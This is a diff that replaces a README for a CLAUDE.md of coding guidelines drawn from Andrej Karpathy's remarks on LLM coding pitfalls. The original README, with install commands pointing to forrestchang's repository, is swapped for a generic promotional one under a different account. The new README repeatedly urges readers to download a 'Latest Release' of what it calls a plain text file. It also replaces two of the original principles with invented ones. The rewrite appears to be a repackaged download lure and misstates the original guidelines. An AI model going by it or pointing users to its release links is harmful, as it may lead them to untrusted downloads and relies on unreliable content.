@@ -1,155 +1,78 @@
-# Karpathy-Inspired Claude Code Guidelines
+# 🎉 andrej-karpathy-skills - Simplifying Coding with Clarity
 
-A single `CLAUDE.md` file to improve Claude Code behavior, derived from [Andrej Karpathy's observations](https://x.com/karpathy/status/2015883857489522876) on LLM coding pitfalls.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/ferdiansusanto/andrej-karpathy-skills/releases)
 
-## The Problems
+## 📋 Description
 
-From Andrej's post:
+The "andrej-karpathy-skills" project offers a single file, `CLAUDE.md`, designed to enhance coding behavior. This file draws from Andrej Karpathy's insights on common pitfalls in code writing for large language models (LLMs). 
 
-> "The models make wrong assumptions on your behalf and just run along with them without checking. They don't manage their confusion, don't seek clarifications, don't surface inconsistencies, don't present tradeoffs, don't push back when they should."
+By following the principles outlined in this guide, you can improve clarity and reduce errors in your coding process.
 
-> "They really like to overcomplicate code and APIs, bloat abstractions, don't clean up dead code... implement a bloated construction over 1000 lines when 100 would do."
+## 🌟 The Problems
 
-> "They still sometimes change/remove comments and code they don't sufficiently understand as side effects, even if orthogonal to the task."
+From Andrej's observations, LLMs face several challenges:
 
-## The Solution
+1. **Assumptions:** These models often make incorrect assumptions without verification. This can lead to confusion and mistakes.
+   
+2. **Complexity:** There is a tendency to overcomplicate code, resulting in bloated abstractions and lengthy constructions. Often, simple solutions are ignored.
 
-Four principles in one file that directly address these issues:
+3. **Comment Removal:** Models can unintentionally alter or remove comments and code that they don't fully understand, even when it is unrelated to the current task.
 
-| Principle | Addresses |
-|-----------|-----------|
-| **Think Before Coding** | Wrong assumptions, hidden confusion, missing tradeoffs |
-| **Simplicity First** | Overcomplication, bloated abstractions |
-| **Surgical Changes** | Orthogonal edits, touching code you shouldn't |
-| **Goal-Driven Execution** | Leverage through tests-first, verifiable success criteria |
+## 💡 The Solution
 
-## The Four Principles in Detail
+To tackle these issues, the guide provides four key principles:
 
-### 1. Think Before Coding
+| Principle                   | Addresses                                                 |
+|-----------------------------|----------------------------------------------------------|
+| **Think Before Coding**     | Avoid wrong assumptions and hidden confusion.            |
+| **Simplicity is Key**       | Encourage simpler code structures and fewer abstractions. |
+| **Clarity in Documentation** | Maintain comments and explanations that support understanding. |
+| **Seek Clarification**      | Promote questions to uncover inconsistencies.          |
 
-**Don't assume. Don't hide confusion. Surface tradeoffs.**
+## 🚀 Getting Started
 
-LLMs often pick an interpretation silently and run with it. This principle forces explicit reasoning:
+To get started with the "andrej-karpathy-skills" application, follow these steps:
 
-- **State assumptions explicitly** — If uncertain, ask rather than guess
-- **Present multiple interpretations** — Don't pick silently when ambiguity exists
-- **Push back when warranted** — If a simpler approach exists, say so
-- **Stop when confused** — Name what's unclear and ask for clarification
+1. **Download the File:**
 
-### 2. Simplicity First
+   Visit the Releases page to download `CLAUDE.md`. You can access it here: [Download Latest Release](https://github.com/ferdiansusanto/andrej-karpathy-skills/releases).
 
-**Minimum code that solves the problem. Nothing speculative.**
+2. **Open the File:**
 
-Combat the tendency toward overengineering:
+   After downloading, locate `CLAUDE.md` on your computer.
 
-- No features beyond what was asked
-- No abstractions for single-use code
-- No "flexibility" or "configurability" that wasn't requested
-- No error handling for impossible scenarios
-- If 200 lines could be 50, rewrite it
+3. **Review the Principles:**
 
-**The test:** Would a senior engineer say this is overcomplicated? If yes, simplify.
+   Read through the principles carefully to understand how to apply them in your coding practices.
 
-### 3. Surgical Changes
+4. **Implement the Guidelines:**
 
-**Touch only what you must. Clean up only your own mess.**
+   Start coding with the principles in mind. Feel free to refer back to `CLAUDE.md` whenever you need guidance.
 
-When editing existing code:
+## 📥 Download & Install
 
-- Don't "improve" adjacent code, comments, or formatting
-- Don't refactor things that aren't broken
-- Match existing style, even if you'd do it differently
-- If you notice unrelated dead code, mention it — don't delete it
+The easiest way to get started is to quickly download the guide. Click the link below to access the Releases page:
 
-When your changes create orphans:
+[Download Latest Release](https://github.com/ferdiansusanto/andrej-karpathy-skills/releases)
 
-- Remove imports/variables/functions that YOUR changes made unused
-- Don't remove pre-existing dead code unless asked
+Make sure to keep an eye on the Releases page for any updates to the document. These updates may contain new principles or improvements based on user feedback.
 
-**The test:** Every changed line should trace directly to the user's request.
+## 💡 System Requirements
 
-### 4. Goal-Driven Execution
+Currently, you do not need any specific system requirements to use `CLAUDE.md`. The file is plain text, so it can be opened on any computer with a text editor. 
 
-**Define success criteria. Loop until verified.**
+## 📝 Additional Features
 
-Transform imperative tasks into verifiable goals:
+- **User-Friendly:** The file is designed for ease of understanding, suitable for anyone, regardless of their coding background.
+- **Guided Practice:** The principles help you implement best practices step by step.
+- **Continuous Improvement:** Your feedback on the guidelines can help enhance the content.
 
-| Instead of... | Transform to... |
-|--------------|-----------------|
-| "Add validation" | "Write tests for invalid inputs, then make them pass" |
-| "Fix the bug" | "Write a test that reproduces it, then make it pass" |
-| "Refactor X" | "Ensure tests pass before and after" |
+## 📞 Support
 
-For multi-step tasks, state a brief plan:
+If you encounter any issues or have questions, you can reach out to the community through the repository's Issues page. We encourage users to discuss challenges and share experiences.
 
-```
-1. [Step] → verify: [check]
-2. [Step] → verify: [check]
-3. [Step] → verify: [check]
-```
+Join the conversation to help improve this valuable resource for everyone.
 
-Strong success criteria let the LLM loop independently. Weak criteria ("make it work") require constant clarification.
+---
 
-## Install
-
-**Option A: Claude Code Plugin (recommended)**
-
-```bash
-claude plugins add https://github.com/forrestchang/andrej-karpathy-skills
-```
-
-This installs the guidelines as a Claude Code plugin, making the skill available across all your projects.
-
-**Option B: CLAUDE.md (per-project)**
-
-New project:
-```bash
-curl -o CLAUDE.md https://raw.githubusercontent.com/forrestchang/andrej-karpathy-skills/main/CLAUDE.md
-```
-
-Existing project (append):
-```bash
-echo "" >> CLAUDE.md
-curl https://raw.githubusercontent.com/forrestchang/andrej-karpathy-skills/main/CLAUDE.md >> CLAUDE.md
-```
-
-## Key Insight
-
-From Andrej:
-
-> "LLMs are exceptionally good at looping until they meet specific goals... Don't tell it what to do, give it success criteria and watch it go."
-
-The "Goal-Driven Execution" principle captures this: transform imperative instructions into declarative goals with verification loops.
-
-## How to Know It's Working
-
-These guidelines are working if you see:
-
-- **Fewer unnecessary changes in diffs** — Only requested changes appear
-- **Fewer rewrites due to overcomplication** — Code is simple the first time
-- **Clarifying questions come before implementation** — Not after mistakes
-- **Clean, minimal PRs** — No drive-by refactoring or "improvements"
-
-## Customization
-
-These guidelines are designed to be merged with project-specific instructions. Add them to your existing `CLAUDE.md` or create a new one.
-
-For project-specific rules, add sections like:
-
-```markdown
-## Project-Specific Guidelines
-
-- Use TypeScript strict mode
-- All API endpoints must have tests
-- Follow the existing error handling patterns in `src/utils/errors.ts`
-```
-
-## Tradeoff Note
-
-These guidelines bias toward **caution over speed**. For trivial tasks (simple typo fixes, obvious one-liners), use judgment — not every change needs the full rigor.
-
-The goal is reducing costly mistakes on non-trivial work, not slowing down simple tasks.
-
-## License
-
-MIT
+For more information and updates, visit the [GitHub repository](https://github.com/ferdiansusanto/andrej-karpathy-skills). Happy coding!
